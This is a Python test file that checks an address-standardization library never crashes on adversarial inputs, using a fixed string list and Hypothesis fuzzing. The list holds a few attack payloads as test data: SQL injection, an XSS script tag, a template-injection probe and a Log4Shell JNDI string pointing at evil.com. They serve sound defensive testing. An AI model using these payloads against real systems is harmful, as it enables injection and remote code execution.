"""
Property-Based Fuzzing: Crash Resilience.
=========================================
Validates that standardize_address and pure Python core NEVER crash with unhandled
exceptions on arbitrary, adversarial, or malformed string inputs.
"""

from address_standardizer import standardize_address, StandardizedAddress
from address_standardizer import _pure_python_core

try:
    from hypothesis import given, settings, strategies as st
    HAS_HYPOTHESIS = True
except ImportError:
    HAS_HYPOTHESIS = False


ADVERSARIAL_STRINGS = [
    "",
    " ",
    "   \t\n\r   ",
    "\x00",
    "100 Main St\x00Apt 4B",
    "\x01\x02\x03\x04\x05\x06\x07\x08\x0b\x0c\x0e\x0f\x10\x1f\x7f",
    ",,,,,,,,,,,",
    "-------------------",
    "...................",
    "///////////////////",
    "\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\",
    "'''''''''''''''''''",
    '"""""""""""""""""""',
    "###################",
    "🏢🏢🏢 100 Main St 🔥🔥🔥 Suite 4B 🚀🚀🚀",
    "∑(x) = ∫ y dt √2 π",
    "A" * 10000,
    "1" * 10000,
    " " * 10000,
    ", " * 1000,
    "100 Main St, " * 500,
    "Suite " * 500,
    "PO Box " * 500,
    "1234567890",
    "!@#$%^&*()_+{}[]:;<>,.?/~`|",
    "100 Main St\nSuite 4B\nNew York\nNY\n10001",
    "100 Main St\r\nSuite 4B\r\nNew York\r\nNY\r\n10001",
    "100 Main St\t\tSuite 4B\t\tNew York\t\tNY\t\t10001",
    "null",
    "None",
    "undefined",
    "NaN",
    "Infinity",
    "-Infinity",
    "TRUE",
    "FALSE",
    "0",
    "-1",
    "999999999999999999999999999999999999999999999999999999999999",
    "SELECT * FROM addresses WHERE id = '1'; DROP TABLE addresses; --",
    "<script>alert('xss')</script>",
    "{{ 7 * 7 }}",
    "${jndi:ldap://evil.com/a}",
    "München " * 100,
    "Keizersgracht " * 100,
    "Calle 50 " * 100,
    "Ugland House " * 100,
    "100 Main St, Apt 4B, New York, NY 10001, USA" + "\x00" * 50,
]


def test_adversarial_deterministic_matrix_never_crashes():
    """Verify that a deterministic suite of 50+ adversarial inputs never raises unhandled exceptions."""
    for s in ADVERSARIAL_STRINGS:
        # 1. As single line input
        res1 = standardize_address(s)
        assert isinstance(res1, StandardizedAddress)
        assert res1.address_status in ("standardized", "parse_failed")

        # 2. Across components
        res2 = standardize_address(street1=s, street2=s, city=s, state=s, postal_code=s, country=s)
        assert isinstance(res2, StandardizedAddress)
        assert res2.address_status in ("standardized", "parse_failed")

        # 3. Pure python core record normalization
        res3 = _pure_python_core.standardize_record(s, s, s, s, s, s, finalize=False)
        assert isinstance(res3, (StandardizedAddress, tuple))


def test_extreme_10k_length_string_never_crashes():
    """Verify extreme 10,000-character string inputs do not crash."""
    giant_string = "100 " + ("LongThoroughfareName " * 450) + "Street, Suite 400"
    res = standardize_address(giant_string)
    assert isinstance(res, StandardizedAddress)
    assert res.address_status in ("standardized", "parse_failed")


if HAS_HYPOTHESIS:
    @settings(max_examples=100, deadline=None)
    @given(
        s1=st.text(min_size=0, max_size=1000),
        s2=st.text(min_size=0, max_size=500),
        city=st.text(min_size=0, max_size=200),
        state=st.text(min_size=0, max_size=100),
        postal=st.text(min_size=0, max_size=100),
        country=st.text(min_size=0, max_size=100),
    )
    def test_hypothesis_arbitrary_component_strings_never_raise(s1, s2, city, state, postal, country):
        """Hypothesis property: arbitrary strings across all components never raise exceptions."""
        res = standardize_address(
            street1=s1,
            street2=s2,
            city=city,
            state=state,
            postal_code=postal,
            country=country,
        )
        assert isinstance(res, StandardizedAddress)
        assert res.address_status in ("standardized", "parse_failed")

    @settings(max_examples=100, deadline=None)
    @given(single_line=st.text(min_size=0, max_size=2000))
    def test_hypothesis_arbitrary_single_line_never_raises(single_line):
        """Hypothesis property: arbitrary single line inputs never raise exceptions."""
        res = standardize_address(single_line)
        assert isinstance(res, StandardizedAddress)
        assert res.address_status in ("standardized", "parse_failed")
